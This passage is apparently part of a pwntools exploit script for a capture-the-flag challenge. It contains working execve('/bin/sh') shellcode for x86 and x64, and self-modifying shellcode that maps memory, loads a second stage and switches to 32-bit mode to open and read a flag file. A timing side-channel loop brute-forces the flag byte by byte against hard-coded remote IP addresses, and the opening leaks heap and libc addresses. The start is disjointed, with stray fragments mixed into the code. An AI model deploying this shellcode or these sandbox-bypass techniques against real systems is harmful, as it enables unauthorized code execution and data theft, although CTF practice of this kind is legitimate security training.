        show(2)
        ru("a"*0x10)
        data1 = uu64(r(6))
        lg('data1',data1)
        heap = data1 - 0x370
        lg('heap',heap)
        lg('addr',addr)
        sys = addr + libc.sym['system']
        fh = addr + libc.sym['__free_hook']
    #------------------------------------------        # edit(0,0x27,0x28)#oof + size  off = size append '+hex(data1))
    def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")
    def lg(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
    #https://www.exploit-db.com/shellcodes
    #-----------------------------------------------------------------------------------------    
    def prepare(p):
        append_x86 = '''
        push ebx
        pop ebx
        '''
        shellcode_x86 = '''
        /*fp = open("flag")*/
        mov esp,0x40404140
        push 0x67616c66
        push esp
        pop ebx
        xor ecx,ecx
        mov eax,5
        int 0x80
        mov ecx,eax
        '''
        shellcode_flag = '''
        push 0x33
        push 0x40404089
        retfq
        /*read(fp,buf,0x70)*/
        mov rdi,rcx
        mov rsi,rsp
        mov rdx,0x70
        xor rax,rax
        syscall
        '''
        shellcode_x86 = asm(shellcode_x86)
        shellcode_flag = asm(shellcode_flag,arch='amd64')
        shellcode = ''
        append = '''
        push rdx
        pop rdx
        '''
        # 0x40404040 为32位shellcode地址
        shellcode_mmap = '''
        /*mmap(0x40404040,0x7e,7,34,0,0)*/
        push 0x40404040 /*set rdi*/
        pop rdi
        push 0x7e /*set rsi*/
        pop rsi
        push 0x40 /*set rdx*/
        pop rax
        xor al,0x47
        push rax
        pop rdx
        push 0x40 /*set r8*/
        pop rax
        xor al,0x40
        push rax
        pop r8
        push rax /*set r9*/
        pop r9
        /*syscall*/
        push rbx
        pop rax
        push 0x5d
        pop rcx
        xor byte ptr[rax+0x31],cl
        push 0x5f
        pop rcx
        xor byte ptr[rax+0x32],cl
        push 0x22 /*set rcx*/
        pop rcx
        push 0x40/*set rax*/
        pop rax
        xor al,0x49
        '''
        shellcode_read = '''
        /*read(0,0x40404040,0x70)*/
        push 0x40404040
        pop rsi
        push 0x40
        pop rax
        xor al,0x40
        push rax
        pop rdi
        xor al,0x40
        push 0x70
        pop rdx
        push rbx
        pop rax
        push 0x5d
        pop rcx
        xor byte ptr[rax+0x57],cl
        push 0x5f
        pop rcx
        xor byte ptr[rax+0x58],cl
        push rdx
        pop rax
        xor al,0x70
        '''
        shellcode_retfq = '''
        push rbx
        pop rax
        xor al,0x40
        push 0x72
        pop rcx
        xor byte ptr[rax+0x40],cl
        push 0x68
        pop rcx
        xor byte ptr[rax+0x40],cl
        push 0x47
        pop rcx
        sub byte ptr[rax+0x41],cl
        push 0x48
        pop rcx
        sub byte ptr[rax+0x41],cl
        push rdi
        push rdi
        push 0x23
        push 0x40404040
        pop rax
        push rax
        '''
        shellcode += shellcode_mmap
        shellcode += append
        shellcode += shellcode_read
        shellcode += append
        shellcode += shellcode_retfq
        shellcode += append
        shellcode = asm(shellcode,arch = 'amd64',os = 'linux')
        # print hex(len(shellcode))
        # pause()
        # gdb.attach(p,"b*0x4002eb\nc")
        p.sendline(shellcode)
        # pause()
        sleep(0.1)
        code1 = shellcode_x86 + 0x29*'\x90' + shellcode_flag
        return code1
        # p.sendline(shellcode_x86 + 0x29*'\x90' + shellcode_flag)
        # p.interactive()
    def pwn(p, index, ch):
        # open
        # shellcode = "push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;"
        # re open, rax => 4
        # shellcode += "push 2; pop rax; syscall;"
        # # read(rax, 0x10040, 0x50)
        # shellcode += "mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;"
        # cmp and jz
        code1 =prepare(p)
        shellcode_cmp=""
        if index == 0:
            shellcode_cmp += "cmp byte ptr[rsi+{0}], {1}; jz $-3; ret".format(index, ch)
        else:
            shellcode_cmp += "cmp byte ptr[rsi+{0}], {1}; jz $-4; ret".format(index, ch)
        shellcode_cmp = asm(shellcode_cmp,arch = 'amd64',os = 'linux')
        p.sendline(code1+shellcode_cmp)
    index = 0
    ans = []
    debug_flag = 1
    while True:
        for ch in range(0x20,0x7f):
            ch = chr(ch)
            ch =ord(ch)
            print(chr(ch))
            if debug_flag:
                # p = remote('8.140.177.7',40334)
                p = remote('39.105.137.118',50050)
            else:
                p = process(prog)
            # prepare()
            pwn(p, index, ch)
            print "======================================================================================>"+chr(ch)
            start = time.time()
            try:
                p.recv(timeout=2)
            except:
                pass
            end = time.time()
            p.close()
            if end-start > 1.5:
                ans.append(ch)
                print("".join([chr(i) for i in ans]))
                break
        else:
            print("".join([chr(i) for i in ans]))
            break
        index=index +1
    print("".join([chr(i) for i in ans]))
​